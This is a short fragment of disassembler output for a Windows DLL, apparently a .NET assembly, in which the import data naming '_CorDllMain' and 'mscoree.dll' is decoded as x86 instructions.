10003747:	00 70 37             	add    %dh,0x37(%eax)
	...
10003752:	00 00                	add    %al,(%eax)
10003754:	8a 37                	mov    (%edi),%dh
10003756:	00 00                	add    %al,(%eax)
10003758:	00 20                	add    %ah,(%eax)
	...
1000376e:	00 00                	add    %al,(%eax)
10003770:	7c 37                	jl     0x100037a9
	...
1000377e:	5f                   	pop    %edi
1000377f:	43                   	inc    %ebx
10003780:	6f                   	outsl  %ds:(%esi),(%dx)
10003781:	72 44                	jb     0x100037c7
10003783:	6c                   	insb   (%dx),%es:(%edi)
10003784:	6c                   	insb   (%dx),%es:(%edi)
10003785:	4d                   	dec    %ebp
10003786:	61                   	popa
10003787:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
1000378e:	72 65                	jb     0x100037f5
10003790:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
10003794:	6c                   	insb   (%dx),%es:(%edi)
10003795:	00 00                	add    %al,(%eax)
10003797:	00 00                	add    %al,(%eax)
10003799:	00 ff                	add    %bh,%bh
1000379b:	25 00 20 00 10       	and    $0x10002000,%eax
